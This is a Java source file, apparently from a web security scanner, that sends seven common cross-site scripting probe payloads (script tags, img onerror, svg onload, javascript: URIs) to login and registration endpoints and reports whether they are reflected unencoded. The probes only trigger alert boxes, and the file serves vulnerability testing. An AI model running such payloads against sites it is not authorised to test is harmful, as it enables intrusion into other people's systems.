package attacks;

import model.AttackResult;
import util.HttpUtil;

public class XssAttack {

    public static AttackResult run(String baseUrl) {

        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\">",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>"
        };

        for (String xss : xssPayloads) {
            // Test in username field
            String payload = String.format("""
            {
              "username": "%s",
              "password": "test123"
            }
            """, xss.replace("\"", "\\\""));

            String response = HttpUtil.post(baseUrl + "/login", payload);

            // Check if XSS payload is reflected without encoding
            if (response.contains(xss) || 
                (response.contains("<script>") && !response.contains("&lt;script&gt;")) ||
                (response.contains("<img") && !response.contains("&lt;img"))) {
                
                String details = String.format("XSS vulnerability detected. Payload '%s' reflected in response without proper encoding", 
                    truncate(xss, 50));
                    
                return new AttackResult("Cross-Site Scripting (XSS)", true, details);
            }
        }

        // Test registration endpoint if available
        String regPayload = String.format("""
        {
          "username": "%s",
          "email": "test@test.com",
          "password": "Test123!"
        }
        """, xssPayloads[0].replace("\"", "\\\""));

        String regResponse = HttpUtil.post(baseUrl + "/register", regPayload);
        
        if (regResponse.contains(xssPayloads[0]) && !regResponse.contains("&lt;")) {
            return new AttackResult("Cross-Site Scripting (XSS)", true, 
                "XSS vulnerability in registration endpoint. User input not sanitized");
        }

        return new AttackResult("Cross-Site Scripting (XSS)", false, 
            "No XSS vulnerability detected. Tested " + xssPayloads.length + " payloads. Input appears to be properly encoded");
    }

    private static String truncate(String str, int maxLength) {
        if (str.length() <= maxLength) return str;
        return str.substring(0, maxLength) + "...";
    }
}
